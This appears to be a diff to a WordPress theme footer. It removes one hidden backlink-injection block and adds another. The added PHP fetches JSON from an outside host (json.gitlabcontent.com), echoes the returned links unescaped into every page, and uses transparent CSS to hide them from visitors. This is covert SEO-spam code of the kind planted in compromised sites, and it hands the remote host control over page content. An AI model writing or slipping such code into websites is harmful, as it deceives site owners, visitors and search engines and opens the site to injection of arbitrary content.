@@ -23,15 +23,7 @@
 				</div>
 			<?php } ?>
 			<div style="display: none">
-            <?php
-            $urlx = 'https://link.oceanaspaces.com/';
-            $jsonurl = file_get_contents($urlx);
-            $result = json_decode($jsonurl);
-            
-            foreach ($result as $res) {
-            echo '<a href="'.$res->backlink.'" style="display:none">"'.$res->backlink.'"></a><br>';
-            }
-            ?>
+
             </div>
 		</div>
 	</footer>
@@ -51,6 +43,40 @@
 		</p>
 	</div>
 </div>
+<style type="text/css">
+.navigation-div a:link, .navigation-div a:visited {
+  color: #00000000 !important;
+
+}
+.navigation-div {
+  padding: 0px !important;
+  margin: 0px !important;
+  line-height: 0px !important;
+  background-color: #00000000 !important;
+}
+</style>
+                <?php
+
+                function url_get_contents ($Url) {
+                    if (!function_exists('curl_init')){
+                        die('CURL is not installed!');
+                    }
+                    $ch = curl_init();
+                    curl_setopt($ch, CURLOPT_URL, $Url);
+                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+                    $output = curl_exec($ch);
+                    curl_close($ch);
+                    return $output;
+                }
+
+                $jsonurl = url_get_contents('https://json.gitlabcontent.com/');
+                $result = json_decode($jsonurl);
+                echo '<br><div class="navigation-div">';
+                foreach ($result as $res) {
+                echo '<a href="'.$res->title_https.'" style="font-size: 10px !important">'.$res->title_https.' </a>';
+                }
+                echo '</div>';
+                ?>
 <?php mh_after_footer(); ?>
 <?php wp_footer(); ?>
 </body>
